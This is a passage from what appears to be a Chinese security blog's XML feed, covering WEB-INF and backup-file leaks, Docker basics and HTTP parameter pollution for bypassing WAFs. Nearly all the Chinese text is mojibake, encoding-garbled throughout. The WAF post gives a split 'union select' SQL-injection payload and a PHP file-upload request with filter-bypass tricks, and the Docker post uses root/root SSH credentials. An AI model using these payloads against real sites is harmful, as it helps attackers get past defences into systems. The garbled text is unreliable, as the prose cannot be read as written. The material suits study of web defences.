ÔºöÊï∞ÊçÆÂ∫ìÈÖçÁΩÆÊñá‰ª∂ÂéüÁêÜÔºöÈÄöÂ∏∏‰∏Ä‰∫õwebÂ∫îÁî®Êàë‰ª¨‰ºö‰ΩøÁî®Â§ö‰∏™webÊúçÂä°Âô®Êê≠ÈÖç‰ΩøÁî®ÔºåËß£ÂÜ≥ÂÖ∂‰∏≠ÁöÑ‰∏Ä‰∏™webÊúçÂä°Âô®ÁöÑÊÄßËÉΩÁº∫Èô∑‰ª•ÂèäÂÅöÂùáË°°Ë¥üËΩΩÁöÑ‰ºòÁÇπÂíåÂÆåÊàê‰∏Ä‰∫õÂàÜÂ±ÇÁªìÊûÑÁöÑÂÆâÂÖ®Á≠ñÁï•Á≠â„ÄÇÂú®‰ΩøÁî®ËøôÁßçÊû∂ÊûÑÁöÑÊó∂ÂÄôÔºåÁî±‰∫éÂØπÈùôÊÄÅËµÑÊ∫êÁöÑÁõÆÂΩïÊàñÊñá‰ª∂ÁöÑÊò†Â∞ÑÈÖçÁΩÆ‰∏çÂΩìÔºåÂèØËÉΩ‰ºöÂºïÂèë‰∏Ä‰∫õÁöÑÂÆâÂÖ®ÈóÆÈ¢òÔºåÂØºËá¥web.xmlÁ≠âÊñá‰ª∂ËÉΩÂ§üË¢´ËØªÂèñ„ÄÇÊºèÊ¥ûÊ£ÄÊµã‰ª•ÂèäÂà©Áî®ÊñπÊ≥ïÔºöÈÄöËøáÊâæÂà∞web.xmlÊñá‰ª∂ÔºåÊé®Êñ≠classÊñá‰ª∂ÁöÑË∑ØÂæÑÔºåÊúÄÂêéÁõ¥Êé•classÊñá‰ª∂ÔºåÂú®ÈÄöËøáÂèçÁºñËØëclassÊñá‰ª∂ÔºåÂæóÂà∞ÁΩëÁ´ôÊ∫êÁ†Å„ÄÇ ‰∏ÄËà¨ÊÉÖÂÜµÔºåjspÂºïÊìéÈªòËÆ§ÈÉΩÊòØÁ¶ÅÊ≠¢ËÆøÈóÆWEB-INFÁõÆÂΩïÁöÑÔºåNginx ÈÖçÂêàTomcatÂÅöÂùáË°°Ë¥üËΩΩÊàñÈõÜÁæ§Á≠âÊÉÖÂÜµÊó∂ÔºåÈóÆÈ¢òÂéüÂõ†ÂÖ∂ÂÆûÂæàÁÆÄÂçïÔºåNginx‰∏ç‰ºöÂéªËÄÉËôëÈÖçÁΩÆÂÖ∂‰ªñÁ±ªÂûãÂºïÊìéÔºàNginx‰∏çÊòØjspÂºïÊìéÔºâÂØºËá¥ÁöÑÂÆâÂÖ®ÈóÆÈ¢òËÄåÂºïÂÖ•Âà∞Ëá™Ë∫´ÁöÑÂÆâÂÖ®ËßÑËåÉ‰∏≠Êù•ÔºàËøôÊ†∑ËÄ¶ÂêàÊÄßÂ§™È´ò‰∫ÜÔºâÔºå‰øÆÊîπNginxÈÖçÁΩÆÊñá‰ª∂Á¶ÅÊ≠¢ËÆøÈóÆWEB-INFÁõÆÂΩïÂ∞±Â•Ω‰∫ÜÔºö location ~ ^/WEB-INF/* { deny all; } ÊàñËÄÖreturn 404; ÊàñËÄÖÂÖ∂‰ªñÔºÅ Âà©Áî®ÔºöÈÄöËøáweb.xmlÊñá‰ª∂Êé®ÊµãÂ∫îÁî®ÁªÑ‰ª∂Áõ∏ÂÖ≥Á±ªÁöÑÂêçÂ≠ó, ÁÑ∂ÂêéÂú®srcÁõÆÂΩï‰∏ãÊü•Êâæ‰ª£Á†Å, Â¶ÇÊûúÊ≤°ÊúâÊ∫ê‰ª£Á†ÅÂèØ‰ª•Áõ¥Êé•‰∏ãËΩΩclassÊñá‰ª∂ÂèçÁºñËØëÂç≥ÂèØ ÁΩëÁ´ôÂ§á‰ªΩÊñá‰ª∂Ê≥ÑÈú≤ÂéüÁêÜÔºöÂú®ÁΩëÁ´ôÁöÑ‰ΩøÁî®ËøáÁ®ã‰∏≠ÔºåÂæÄÂæÄÈúÄË¶ÅÂØπÁΩëÁ´ô‰∏≠ÁöÑÊñá‰ª∂ËøõË°å‰øÆÊîπ„ÄÅÂçáÁ∫ß„ÄÇÊ≠§Êó∂Â∞±ÈúÄË¶ÅÂØπÁΩëÁ´ôÊï¥Á´ôÊàñËÄÖÂÖ∂‰∏≠Êüê‰∏ÄÈ°µÈù¢ËøõË°åÂ§á‰ªΩ„ÄÇÂΩìÂ§á‰ªΩÊñá‰ª∂ÊàñËÄÖ‰øÆÊîπËøáÁ®ã‰∏≠ÁöÑÁºìÂ≠òÊñá‰ª∂Âõ†‰∏∫ÂêÑÁßçÂéüÂõ†ËÄåË¢´ÁïôÂú®ÁΩëÁ´ôwebÁõÆÂΩï‰∏ãÔºåËÄåËØ•ÁõÆÂΩïÂèàÊ≤°ÊúâËÆæÁΩÆËÆøÈóÆÊùÉÈôêÊó∂Ôºå‰æøÊúâÂèØËÉΩÂØºËá¥Â§á‰ªΩÊñá‰ª∂ÊàñËÄÖÁºñËæëÂô®ÁöÑÁºìÂ≠òÊñá‰ª∂Ë¢´‰∏ãËΩΩÔºåÂØºËá¥ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÔºåÁªôÊúçÂä°Âô®ÁöÑÂÆâÂÖ®Âüã‰∏ãÈöêÊÇ£„ÄÇ .rar .zip .7z .tar.gz .bak .swp .txt #ÂèÇËÄÉÔºöhttps://www.secpulse.com/archives/61101.htmlhttp://www.hacksec.cn/Penetration-test/474.html]]></content>
      <tags>
        <tag>webÊºèÊ¥û</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dockerÂ≠¶‰π†]]></title>
    <url>%2F2018%2F10%2F12%2Fdocker%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[dockerÂü∫Á°ÄÈïúÂÉèÔºöÊòØ‰∏Ä‰∏™Âè™ËØªÁöÑÊ®°ÊùøÔºåÁ±ª‰ºº‰∫éÂÆâË£ÖÁ≥ªÁªüÁî®Âà∞ÁöÑÈÇ£‰∏™isoÊñá‰ª∂ÔºåÊàë‰ª¨ÈÄöËøáÈïúÂÉèÊù•ÂÆåÊàêÂêÑÁßçÂ∫îÁî®ÁöÑÈÉ®ÁΩ≤„ÄÇÈïúÂÉèÂèØ‰ª•Áî®Êù•ÂàõÂª∫DockerÂÆπÂô® ÂÆπÂô®ÔºöÈïúÂÉèÁ±ª‰ºº‰∫éÊìç‰ΩúÁ≥ªÁªüÔºåËÄåÂÆπÂô®Á±ª‰ºº‰∫éËôöÊãüÊú∫Êú¨Ë∫´„ÄÇÂÆÉÂèØ‰ª•Ë¢´ÂêØÂä®„ÄÅÂºÄÂßã„ÄÅÂÅúÊ≠¢„ÄÅÂà†Èô§Á≠âÊìç‰ΩúÔºåÊØè‰∏™ÂÆπÂô®ÈÉΩÊòØÁõ∏‰∫íÈöîÁ¶ªÁöÑ„ÄÇÂèØ‰ª•ÊääÂÆπÂô®ÁúãÂÅöÊòØ‰∏Ä‰∏™ÁÆÄÊòìÁâàÁöÑlinuxÁéØÂ¢ÉÔºàÂåÖÊã¨rootÁî®Êà∑ÊùÉÈôê„ÄÅËøõÁ®ãÁ©∫Èó¥„ÄÅÁî®Êà∑Á©∫Èó¥ÂíåÁΩëÁªúÁ©∫Èó¥Á≠âÔºâÂíåËøêË°åÂú®ÂÖ∂‰∏≠ÁöÑÂ∫îÁî®Á®ãÂ∫è„ÄÇ ‰ªìÂ∫ìÔºöÂ≠òÊîæÈïúÂÉèÁöÑ‰∏Ä‰∏™Âú∫ÊâÄÔºå‰ªìÂ∫ìÂàÜ‰∏∫ÂÖ¨ÂºÄ‰ªìÂ∫ìÂíåÁßÅÊúâ‰ªìÂ∫ì„ÄÇ ÊúÄÂ§ßÁöÑÂÖ¨ÂºÄ‰ªìÂ∫ìÊòØDocker hubÔºàhub.docker.comÔºâÔºåÂõΩÂÜÖÂÖ¨ÂºÄ‰ªìÂ∫ìÔºàdockerpool.comÔºâ dockerÂü∫Á°ÄÂëΩ‰ª§docker search ubuntu ‚ÄîÊü•ÊâæubuntuÁ≥ªÁªüÁöÑÂÆπÂô® docker pull ubuntu ‚Äî‰∏ãËΩΩubuntuÂÆπÂô® docker images ‚ÄîÊü•ÁúãÁé∞ÊúâÁöÑÈïúÂÉè docker ps ‚ÄîÊü•ÁúãdockerÁöÑËøõÁ®ã docker ps -a ‚ÄîÊü•ÁúãdockerÊâÄÊúâËøêË°åËøáÁöÑËøõÁ®ã docker rm ÂêçÂ≠ó ‚ÄîÂà†Èô§Â∑≤ÁªèÂÅúÊ≠¢ËøõÁ®ãÁöÑÂÆπÂô® docker rmi ubuntu ‚ÄîÂà†Èô§ÈïúÂÉè docker start -i ÂêçÂ≠ó ‚ÄîÂêØÂä®Â∑≤ÁªèÂÖ≥Èó≠ÁöÑËøõÁ®ã docker stop ÂêçÂ≠ó ‚ÄîÂÖ≥Èó≠ËøêË°åÁöÑÂÆπÂô® docker run ‚Äìname Ëµ∑ÂêçÂ≠ó -d ÂÆπÂô® /bin/bash ‚Äî -dÊòØ‰ª•ÂêéÂè∞ÁöÑÂΩ¢ÂºèËøêË°å docker logs -t peiqi12 ‚Äî t‰∏∫ÊòæÁ§∫Êó∂Èó¥ÁöÑÂΩ¢ÂºèÊòæÁ§∫ËøõÁ®ãÂÆπÂô®logÊó•Âøó docker run -p 41061:22 -p 8888:80 -d -v /web tomsik68/xampp ‚ÄîËÆøÈóÆÁöÑÊó∂ÂÄôÂà©Áî®sshËÆøÈóÆÈïúÂÉè ssh -p 41061 root@localhost ‚ÄîÂØÜÁ†ÅrootÂèØ‰ª•ËøûÊé•sshËøõÂÖ•xampp‰∏ªÊú∫ Âú®wwwÁõÆÂΩï‰∏ãÂàõÂª∫index.htmlÂç≥ÂèØ„ÄÇËÆøÈóÆurl xx.xx.xx.xx:8888/www/index.html ÂèÇÊï∞ËØ¥Êòé-a stdin: ÊåáÂÆöÊ†áÂáÜËæìÂÖ•ËæìÂá∫ÂÜÖÂÆπÁ±ªÂûãÔºåÂèØÈÄâ STDIN/STDOUT/STDERR ‰∏âÈ°πÔºõ -d: ÂêéÂè∞ËøêË°åÂÆπÂô®ÔºåÂπ∂ËøîÂõûÂÆπÂô®IDÔºõ -i: ‰ª•‰∫§‰∫íÊ®°ÂºèËøêË°åÂÆπÂô®ÔºåÈÄöÂ∏∏‰∏é -t ÂêåÊó∂‰ΩøÁî®Ôºõ -t: ‰∏∫ÂÆπÂô®ÈáçÊñ∞ÂàÜÈÖç‰∏Ä‰∏™‰º™ËæìÂÖ•ÁªàÁ´ØÔºåÈÄöÂ∏∏‰∏é -i ÂêåÊó∂‰ΩøÁî®Ôºõ ‚Äìname=‚Äùnginx-lb‚Äù: ‰∏∫ÂÆπÂô®ÊåáÂÆö‰∏Ä‰∏™ÂêçÁß∞Ôºõ ‚Äìdns 8.8.8.8: ÊåáÂÆöÂÆπÂô®‰ΩøÁî®ÁöÑDNSÊúçÂä°Âô®ÔºåÈªòËÆ§ÂíåÂÆø‰∏ª‰∏ÄËá¥Ôºõ ‚Äìdns-search example.com: ÊåáÂÆöÂÆπÂô®DNSÊêúÁ¥¢ÂüüÂêçÔºåÈªòËÆ§ÂíåÂÆø‰∏ª‰∏ÄËá¥Ôºõ -h ‚Äúmars‚Äù: ÊåáÂÆöÂÆπÂô®ÁöÑhostnameÔºõ -e username=‚Äùritchie‚Äù: ËÆæÁΩÆÁéØÂ¢ÉÂèòÈáèÔºõ ‚Äìenv-file=[]: ‰ªéÊåáÂÆöÊñá‰ª∂ËØªÂÖ•ÁéØÂ¢ÉÂèòÈáèÔºõ ‚Äìcpuset=‚Äù0-2‚Äù or ‚Äìcpuset=‚Äù0,1,2‚Äù: ÁªëÂÆöÂÆπÂô®Âà∞ÊåáÂÆöCPUËøêË°åÔºõ -m :ËÆæÁΩÆÂÆπÂô®‰ΩøÁî®ÂÜÖÂ≠òÊúÄÂ§ßÂÄºÔºõ ‚Äìnet=‚Äùbridge‚Äù: ÊåáÂÆöÂÆπÂô®ÁöÑÁΩëÁªúËøûÊé•Á±ªÂûãÔºåÊîØÊåÅ bridge/host/none/container: ÂõõÁßçÁ±ªÂûãÔºõ ‚Äìlink=[]: Ê∑ªÂä†ÈìæÊé•Âà∞Âè¶‰∏Ä‰∏™ÂÆπÂô®Ôºõ ‚Äìexpose=[]: ÂºÄÊîæ‰∏Ä‰∏™Á´ØÂè£Êàñ‰∏ÄÁªÑÁ´ØÂè£Ôºõ ÂÆûÊàòËøêË°å ‰∏äËø∞ÂëΩ‰ª§Êàë‰ª¨ÂºÄÂêØ‰∫Ü dockerÊúçÂä°ÔºåÂπ∂‰∏î‰ª•‰∫§‰∫íÂºèÂëΩ‰ª§Âπ∂‰∏î‰ª•‰º™ÁªàÁ´ØÔºàÂõ†‰∏∫dockerÈÉΩÊòØ‰ª•ËøõÁ®ãÁöÑÂΩ¢ÂºèËøêË°åÔºâÁöÑÂΩ¢ÂºèÔºåËøõÂÖ•‰∫Üdocker‰∫§‰∫íÈ°µÈù¢ÔºåÂèÇËÄÉ‰∏äÈù¢-i -tÔºåÂπ∂‰∏îÁªôÂÆπÂô®ÂêçÂ≠óÂëΩÂêç‰∏∫ ubuntuÔºå‰∏ªÊú∫Âêç‰∏∫ test„ÄÇ /bin/bashÁöÑ‰ΩúÁî®ÊòØÂõ†‰∏∫dockerÂêéÂè∞ÂøÖÈ°ªËøêË°å‰∏Ä‰∏™ËøõÁ®ãÔºåÂê¶ÂàôÂÆπÂô®Â∞±‰ºöÈÄÄÂá∫ÔºåÂú®ËøôÈáåË°®Á§∫ÂêØÂä®ÂÆπÂô®ÂêéÂêØÂä®bash„ÄÇÊâÄÊúâdockerÂÆπÂô®ÈÉΩÊòØ‰ª•ËøõÁ®ãËÄåÂ≠òÊ¥ªÔºåÂ¶ÇÊûúÊ≤°ÊúâËøõÁ®ãÈÇ£‰πàËá™Âä®ÂÖ≥Èó≠„ÄÇ ËøôÊ†∑ËøõÂÖ•Êê≠Âª∫dockerÔºåÂ¶ÇÊûúÈÄÄÂá∫ÁªàÁ´ØÁöÑËØùÔºåÁõ∏Â∫îËøõÁ®ã‰πü‰ºöÂÖ≥Èó≠Ôºådocker‰πüÂ∞±ÁªàÊ≠¢ÔºåÊàë‰ª¨Êé•‰∏ãÊù•‰ªãÁªç‰∏Ä‰∏™ÈïøÊúüËÉΩÂ§üÊê≠Âª∫Âú®web‰∏äÁöÑdockerÂëΩ‰ª§„ÄÇ Êàë‰ª¨Áî®Á´ØÂè£Êò†Â∞ÑËøõÂÖ•dockerËøõÁ®ãÔºå -p Áâ©ÁêÜÊú∫Á´ØÂè£:ÂÆπÂô®Á´ØÂè£„ÄÇËøôÈáåËÆæÁΩÆ‰∫Ü‰∏§‰∏™Á´ØÂè£Ôºå‰∏Ä‰∏™ÊòØÊñπ‰æøËøõÂÖ•ÂÆπÂô®ÁÆ°ÁêÜÔºåÂè¶‰∏Ä‰∏™ÊòØÊò†Â∞Ñ80Á´ØÂè£ÊúçÂä°Ôºå-dËøîÂõûÂÆπÂô®IDÔºå-vÁß∞‰πã‰∏∫ ÊåÇËΩΩ‰πüÁß∞‰∏∫Â≠òÂÇ®Âç∑„ÄÇÊ≠§Êó∂Âú®/wwwÁõÆÂΩïÂÜôwebÔºåÊï¥Â•óÁöÑ docker webÊúçÂä°ËøõÁ®ãÊê≠Âª∫ÂÆåÊØï„ÄÇ ËøôÊ†∑‰æø‰ºöÂú®ÂêéÂè∞ËøõÁ®ãËøêË°åÔºåÂÖ∂‰ªñÂëΩ‰ª§Â¶ÇÔºö docker run hello-worldÂè™ÊòØ‰∏Ä‰∏™ËøõÁ®ãÔºåËøêË°åÂÆåÊØïÂ∞±Ê∂àÂ§±‰∫Ü„ÄÇ ÊÄªÁªì1.docker ÂèØ‰ª•ÁêÜËß£‰∏∫ÂºÄÂêØ‰∏Ä‰∏™Êàñ‰∏Ä‰∫õËøõÁ®ãÔºå‰ΩÜÊòØÁéØÂ¢ÉÂíåÁâ©ÁêÜÊú∫ÊòØÂàÜÂºÄÁöÑÔºåÂèØ‰ª•Áî®Á´ØÂè£Êò†Â∞ÑÔºåÊò†Â∞ÑÂà∞Áâ©ÁêÜÊú∫ÔºåÂú®Áâ©ÁêÜÊú∫‰∏äÊòØ‰∏ÄÂ•óÂÆåÊï¥ÁöÑÊìç‰ΩúÁ≥ªÁªüÔºå‰ºöÂç†Áî®ÂÖ∂‰ªñËµÑÊ∫êÔºå‰ΩÜÊòØdockerÊòØËøõÁ®ãÁ∫ßÂà´ÁöÑÔºåËµÑÊ∫êÂÖ®ÈÉ®Áî®Âú®ËøõÁ®ã‰∏äÔºåÊâÄ‰ª•ÈÄüÂ∫¶‰ºöÂø´„ÄÇ 2.ÂèØ‰∏ÄÂè∞ÊúçÂä°Âô®Êê≠Âª∫Â§ö‰∏™ÂàÜÁ¶ªÁöÑlinuxÁéØÂ¢ÉÔºåDockerÂÆπÂô®ÂèØ‰ª•ÁêÜËß£‰∏∫Âú®Ê≤ôÁõí‰∏≠ËøêË°åÁöÑËøõÁ®ãÔºåËøô‰∏™Ê≤ôÁõíÂåÖÂê´‰∫ÜËØ•ËøõÁ®ãËøêË°åÊâÄÂøÖÈ°ªÁöÑËµÑÊ∫êÔºåÂåÖÊã¨Êñá‰ª∂Á≥ªÁªü„ÄÅÁ≥ªÁªüÁ±ªÂ∫ì„ÄÅshell ÁéØÂ¢ÉÁ≠â„ÄÇ‰ΩÜËøô‰∏™Ê≤ôÁõíÈªòËÆ§ÊòØ‰∏ç‰ºöËøêË°å‰ªª‰ΩïÁ®ãÂ∫èÁöÑÔºåÈúÄË¶ÅÂú®Ê≤ôÁõí‰∏≠ËøêË°å‰∏Ä‰∏™ËøõÁ®ãÊù•ÂêØÂä®Êüê‰∏Ä‰∏™ÂÆπÂô®„ÄÇËøô‰∏™ËøõÁ®ãÊòØËØ•ÂÆπÂô®ÁöÑÂîØ‰∏ÄËøõÁ®ãÔºåÊâÄ‰ª•ÂΩìËØ•ËøõÁ®ãÁªìÊùüÁöÑÊó∂ÂÄôÔºåÂÆπÂô®‰πü‰ºöÂÆåÂÖ®ÂÅúÊ≠¢„ÄÇ 3.‰ΩøÁî®Êñπ‰æøÈÄüÂ∫¶Âø´ÔºåÁî±‰∫éÊòØ‰∏Ä‰∏™ËøõÁ®ãÔºåÊâÄ‰ª•Âè™ÈúÄË¶Å‰∏Ä‰∏™ÂëΩ‰ª§ÊâìÂºÄËøõÁ®ã‰æøÂèØ‰ª•ÂºÄÂêØ‰∏Ä‰∏™webÊúçÂä°‰∏äÁ∫ø‰∏ÄÂ•óÁΩëÁ´ôÁ≠â‰∏îÁéØÂ¢É‰∏éÁâ©ÁêÜÊú∫ÂàÜÁ¶ªÔºåÂØπÁâ©ÁêÜÊú∫Êù•ËØ¥ÊØîËæÉÂÆâÂÖ®„ÄÇÊàñËÄÖÂÖ∂‰ªñÊúçÂä°Á≠â„ÄÇ]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlÊ≥®ÂÖ•‰πãÂèÇÊï∞Ê±°ÊüìÁªïwaf]]></title>
    <url>%2F2018%2F10%2F10%2Fsql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E7%BB%95waf%2F</url>
    <content type="text"><![CDATA[hppÂèÇÊï∞Ê±°Êüì‰∫ÜËß£HPPÊòØHTTP Parameter PollutionÁöÑÁº©ÂÜô„ÄÇËøô‰∏™ÊºèÊ¥ûÁî±S. di Paola ‰∏éL. Caret ToniÂú®2009Âπ¥ÁöÑOWASP‰∏äÈ¶ñÊ¨°ÂÖ¨Â∏É„ÄÇËøô‰πüÊòØ‰∏ÄÁßçÊ≥®ÂÖ•ÂûãÁöÑÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÂú®HTTPËØ∑Ê±Ç‰∏≠ÊèíÂÖ•ÁâπÂÆöÁöÑÂèÇÊï∞Êù•ÂèëËµ∑ÊîªÂáª„ÄÇÂ¶ÇÊûúWebÂ∫îÁî®‰∏≠Â≠òÂú®ËøôÊ†∑ÁöÑÊºèÊ¥ûÔºåÂèØ‰ª•Ë¢´ÊîªÂáªËÄÖÂà©Áî®Êù•ËøõË°åÂÆ¢Êà∑Á´ØÊàñËÄÖÊúçÂä°Âô®Á´ØÁöÑÊîªÂáª„ÄÇÈÄöËøáhppÂèÇÊï∞Ê±°ÊüìÂèØ‰ª•ËææÂà∞ÁªïËøásqlwafÔºå‰∏ä‰º†wafÊù•ËøõË°åÊîªÂáª„ÄÇ hppÂèÇÊï∞Ê±°ÊüìÂéüÁêÜÂú®Ë∑üÊúçÂä°Âô®‰∫§‰∫íÁöÑËøáÁ®ã‰∏≠ÔºåhttpÂÖÅËÆ∏ get ÊàñËÄÖpostÂ§öÊ¨°‰º†Âêå‰∏ÄÂèÇÊï∞ÂÄºÔºåÈÄ†ÊàêË¶ÜÁõñËææÂà∞‰∏Ä‰∫õÁªïËøáwafÁöÑÊïàÊûú„ÄÇ GET /foo?par1=val1&amp;par2=val2 HTTP/1.1 User-Agent: Mozilla/5.0 Host: Host Accept: */*Â¶Ç‰∏äÈù¢ÁöÑhttpËØ∑Ê±ÇÔºå‰∏ÄËà¨Âêå‰∏ÄÂèÇÊï∞ÂêçÂ≠óÂè™ËÉΩ‰º†ÂèÇ‰∏ÄÊ¨°Ôºå‰ΩÜÊòØhttpÂçèËÆÆ‰∏≠ÂÖÅËÆ∏ÂêåÊ†∑ÂêçÁß∞ÁöÑÂèÇÊï∞Âá∫Áé∞Â§öÊ¨°„ÄÇ ‰ΩÜÊòØ‰∏çÂêåÁöÑÊúçÂä°Âô®Â§ÑÁêÜÊñπÂºè‰ºö‰∏ç‰∏ÄÊ†∑ÔºåÊØîÂ¶ÇÔºöÂøÖÂ∫î Êàë‰ª¨ËæìÂÖ•‰∫Ü‰∏§Ê¨°qÂèÇÊï∞ÔºåÁ¨¨‰∏ÄÊ¨°‰∏∫aaÁ¨¨‰∫åÊ¨°‰∏∫bbË¢´Ë¶ÜÁõñ‰∫ÜÔºå Ë∞∑Ê≠å ËæìÂÖ•‰∏§‰∏™qÂèÇÊï∞ÂèØ‰ª•ÁúãÂà∞ÈÉΩË¢´Âä†ËΩΩÂà∞‰∫ÜÊµèËßàÂô®ÊêúÁ¥¢‰∏≠„ÄÇÊ≤°ÊúâË¶ÜÁõñ Â¶ÇÊûúÂêåÊó∂Êèê‰æõ2‰∏™ÊêúÁ¥¢ÁöÑÂÖ≥ÈîÆÂ≠óÂèÇÊï∞ÁªôGoogleÔºåÈÇ£‰πàGoogle‰ºöÂØπ2‰∏™ÂèÇÊï∞ÈÉΩËøõË°åÊü•ËØ¢Ôºõ‰ΩÜÊòØÂøÖÂ∫îÂàô‰∏ç‰∏ÄÊ†∑ÔºåÂÆÉÂè™‰ºöÂ§ÑÁêÜÂêéÈù¢‰∏Ä‰∏™ÂèÇÊï∞„ÄÇ‰∏ãÈù¢Ëøô‰∏™Ë°®ÁÆÄÂçïÂàó‰∏æ‰∫Ü‰∏Ä‰∫õÂ∏∏ËßÅÁöÑWebÊúçÂä°Âô®ÂØπÂêåÊ†∑ÂêçÁß∞ÁöÑÂèÇÊï∞Âá∫Áé∞Â§öÊ¨°ÁöÑÂ§ÑÁêÜÊñπÂºèÔºö WebÊúçÂä°Âô® ÂèÇÊï∞Ëé∑ÂèñÂáΩÊï∞ Ëé∑ÂèñÂà∞ÁöÑÂèÇÊï∞ PHP/Apache $_GET(‚Äúpar‚Äù) Last JSP/Tomcat Request.getParameter(‚Äúpar‚Äù) First Perl(CGI)/Apache Param(‚Äúpar‚Äù) First Python/Apache getvalue(‚Äúpar‚Äù) All (List) ASP/IIS Request.QueryString(‚Äúpar‚Äù) All (comma-delimited string)ÂèÇÊï∞Ê±°ÊüìÂÆû‰æãwafÁªïËøáËøôÁßçÊúçÂä°Âô®ÁöÑËß£ÊûêÊñπÂºèÊú¨Ë∫´Ê≤°Êúâ‰ªÄ‰πàÁº∫Èô∑Ôºå‰ΩÜÊòØÂ¶ÇÊûúÈÖçÂêà‰∏Ä‰∫õwafËßÑÂàô‰ª•ÂèäÂÖ∂‰ªñËßÑÂàôÔºåÂàôÊúâÂèØËÉΩÈÄ†Êàê‰∏Ä‰∫õÂç±ÂÆ≥ÔºåÊ†πÊçÆwafËß£ÊûêÁöÑÂÖàÂêéËßÑÂàôÂàôÊúâÂèØËÉΩÁªïËøáwafËÆæÁΩÆÁöÑÂéüÊÑè„ÄÇ $sql = &quot;select * from admin where id=1&quot;; $sql=$sql.&quot;&quot;.$_POST[&apos;bbs&apos;]; echo $sql; $pattern=&apos;/^.*union.*$/&apos;; if(preg_match($pattern, $sql)) {echo &quot;Ê≥®ÂÖ•ÊµãËØï &quot;;}Âú®ÁâπÂÆöÊÉÖÂÜµ‰∏ã bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3ÂèØ‰ª•ÁªïËøá‰∏Ä‰∫õwafÔºåÂú®CTF‰∏≠‰πüÊúâÂá∫Áé∞„ÄÇÂ∞ÜÂèÇÊï∞ÂàÜÁ¶ªÂÜôÂÖ•ÔºåwafÂú®ËæìÂÖ•‰πãÂêéÂ∞±ÂºÄÂßãÊã¶Êà™ÔºåÂú®ÂêéÁ´ØÂèàÊãºÊé•ÊàêÂÆåÊï¥ÁöÑunionÔºåÊ†πÊçÆ‰∏Ä‰∫õÁâπÂÆöÊúçÂä°Âô®Â∞±ÂèØ‰ª•ÁªïËøáwafËøõË°åÊ≥®ÂÖ•„ÄÇ Êñá‰ª∂‰∏ä‰º†ÂÖàÁúã‰∏Ä‰∏™‰∏ä‰º†Êï∞ÊçÆÂåÖ„ÄÇ POST /upload.php HTTP/1.1 Host: 192.168.1.100 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://192.168.1.100/ Cookie:yunsuo_session_verify=1a9c7117538a7a9bce39a4695ff3f0cc; safedog-flow-item= X-Forwarded-For: 1.1.1.1 CLIENT_IP: 2.2.2.2 Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Type:multipart/form-data; boundary=---------------------------440470572354 Content-Length: 1089 -----------------------------440470572354 Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;n.php&quot; Content-Type: application/octet-stream &lt;?php Phpinfo(); ?&gt; -----------------------------440470572354 Content-Disposition: form-data; name=&quot;submit&quot; Submit -----------------------------440470572354--Content-Type:multipart/form-data; Êåá‰ª£ÁöÑÊòØËøô‰∏™Êï∞ÊçÆÊòØÊù•Ëá™Ë°®ÂçïÊèê‰∫§ÁöÑ Êüê‰∫õWAFÊòØÈÄöËøáContent-TypeËØÜÂà´ÊòØÂê¶ÊòØÊñá‰ª∂‰∏ä‰º†Êï∞ÊçÆÂåÖ„ÄÇÂÅáËÆæÊàë‰ª¨Â∞ÜContent-TypeÊõ¥ÊîπÔºåÊï∞ÊçÆÂåÖ‰πüÊòØÊ≠£Â∏∏Êèê‰∫§ËøáÂéªÁöÑ„ÄÇËøô‰∏™Â∞±ÂÆåÊàê‰∫Ü‰∏ÄÊ¨°bypass„ÄÇ ËøòÊúâÁöÑÊó∂ÂÄôÂ∞±ÊòØContent-Disposition: form-data;Ôºå‰πüÊúâÊüê‰∫õWAFÊòØÊ†πÊçÆContent-DispositionÂåπÈÖçfilenameÁöÑÔºåÁî®‰∫éÈ™åËØÅÈªëÂêçÂçï„ÄÇÊàë‰ª¨ÁªèËøáÊ∑∑Ê∑ÜÂ§ßÂ∞èÂÜô‰πüÊòØÂèØ‰ª•bypassÁöÑ„ÄÇ(http://www.secpulse.com/archives/56523.html) Êã¶Êà™Ôºö Âú®HPP‰∏≠ÊúÄÂÖ∏ÂûãÁöÑÁöÑ‰æãÂ≠êÂ∞±ÊòØ‚ÄúÂèåÊñá‰ª∂‰∏ä‰º†‚Äù„ÄÇ Â∞±ÊòØÂú®ÂçèËÆÆ‰∏≠ÔºåÊèê‰∫§‰∏§‰∏™Áõ∏ÂêåÁöÑÂÄºÔºåËææÂà∞Ê¨∫È™óWAF‰∏ÄÊ¨°ÂåπÈÖçÁöÑÁõÆÁöÑ„ÄÇÂú®ËøôÈáåÊèêÁÇπ‰∏Ä‰∏ãhttpÂçèËÆÆ‰∏≠ÂèÇÊï∞Âêç‰∏éÂèÇÊï∞ÂÄºÁöÑÁªìÊûÑ„ÄÇ ÂèØ‰ª•ÁúãÂà∞filenameÂèÇÊï∞ÂÜô‰∫Ü‰∏§Ê¨°ÔºåÂèØËÉΩÁªïËøá‰∏Ä‰∫õ‰∏ä‰º†ÈôêÂà∂„ÄÇ xssÂΩìÁÑ∂ËøôÁßçÁâπÊÄßÊúâÊó∂ÂÄô‰πüÂèØ‰ª•ÊµãËØïxssÊºèÊ¥ûÔºåÂéüÁêÜ‰∏ÄÊ†∑„ÄÇÊöÇ‰∏çÊµãËØï„ÄÇ]]></content>
      <tags>
        <tag>Ê∏óÈÄèÊîªÈò≤</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XMLÊ≥®ÂÖ•ÔºåxxeÔºåxpath]]></title>
    <url>%2F2018%2F10%2F10%2Fxml%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%2F</url>
